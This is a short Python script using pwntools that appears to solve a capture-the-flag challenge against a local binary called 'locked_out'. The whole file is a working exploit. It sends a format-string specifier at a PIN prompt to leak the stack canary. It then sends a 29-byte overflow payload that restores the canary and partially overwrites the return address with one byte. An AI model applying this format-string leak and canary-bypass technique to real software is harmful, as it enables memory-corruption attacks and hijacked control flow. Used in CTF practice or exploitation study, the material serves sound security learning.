from pwn import *

context.log_level = 'info'

p = process("./locked_out")
p.recvuntil(b"PIN: ")
p.send(b"%9$p")
line = p.recvline()
canary = int(line.split(b' ')[0], 16)
log.info("leaked canary = %#x" % canary)
payload = b"A" * 4          
payload += b"B" * 4         
payload += p32(0)           
payload += p64(canary)    
payload += b"C" * 8         
payload += b"\xda"        
assert len(payload) == 29
p.recvuntil(b"PIN: ")
p.send(payload)
out = p.recvall(timeout=5)
print(out.decode(errors="replace"))

